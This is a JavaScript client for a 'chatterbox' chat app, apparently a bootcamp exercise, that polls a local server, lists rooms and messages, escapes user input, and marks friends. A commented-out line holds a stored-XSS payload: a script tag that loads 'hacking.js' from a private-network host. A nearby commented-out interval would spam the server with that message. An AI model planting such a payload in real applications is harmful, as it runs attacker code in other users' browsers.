var message = {
  username: 'undefined',
  text: 'undefined',
  roomname: 'undefined'
  //roomname: '<script src="http://10.16.3.118:8080/hacking.js"></script>'
};

var friends = [];
var lastSelected = 'all';

var checkSelection = function () {
  lastSelected = $('.dropdown option:selected').text();
};

var populateRooms = function (data) {
  $('select').html('<option value="all">all</option>');

  let rooms = data.map(elem => {
    return _.escape(elem.roomname); //dont get tricked kids
  });
  rooms = _.uniq(rooms);
  rooms.forEach(room => {
    let $option = $(`<option value="${room}">${room}</option>`);
    if (room === lastSelected) {
      $option = $(`<option value="${room}" selected="selected">${room}</option>`);
    }
    $('select').append($option);
  });
};

var addMessages = function (messages) {

  //assignment & filtering
  let texts = [];
  for (let i = 0; i < messages.length; i++) {
    if (texts.length === 30) {
      break;
    }

    let current = {
      text: messages[i].text,
      usr: messages[i].username,
      room: messages[i].roomname
    };

    if (lastSelected || lastSelected === '') {
      if (current.room === lastSelected || lastSelected === 'all') {
        texts.push(current);
      }
    } else {
      texts.push(current);
    }
  }

  //dom manipulation

  $('.chatContainer').html('');
  texts.forEach(elem => {
    let $span = $(`<span class="sms"></span>`);

    let $username = $(`<a class="usr"></a>`);

    $username.text(_.escape(elem.usr));
    if (friends.includes($username.text())) {
      $username.addClass('friend');
    }

    let message = `: ${(_.escape(elem.text))}`;


    $span.append($username);
    $span.append(message);


    $('.chatContainer').prepend($span);

  });

  setTimeout(app.fetch, 100);
};




var app = {
  server: 'http://127.0.0.1:3000/classes/messages',
  init: () => {},
  send: (message) => {
    $.ajax({
      // This is the url you should use to communicate with the parse API server.
      url: app.server,
      type: 'POST',
      data: JSON.stringify(message),
      contentType: 'application/json',
      success: function (data) {
        return data;
      },
      error: function (data) {
        // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
        console.error('chatterbox: Failed to send message', data);
      }
    });
  },
  fetch: () => {
    $.ajax({
      // This is the url you should use to communicate with the parse API server.
      url: app.server,
      type: 'GET',
      // data: {
      //   order: '-updatedAt',
      //   limit: '200'
      // },
      contentType: 'application/json',
      success: function (data) {
        checkSelection();
        populateRooms(data.results);
        addMessages(data.results);
      },
      error: function (data) {
        // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
        console.error('chatterbox: Failed to get', data);
      }
    });
  },
};
//setInterval(app.send.bind(this, message), 500);
app.fetch();

//friend stuff
$(document).on('click', '.usr', (event) => {
  let target = event.currentTarget;
  if (!friends.includes($(target).text())) {
    friends.push($(target).text());
  }
  $(target).css({
    "font-weight": 'bold',
  });
});
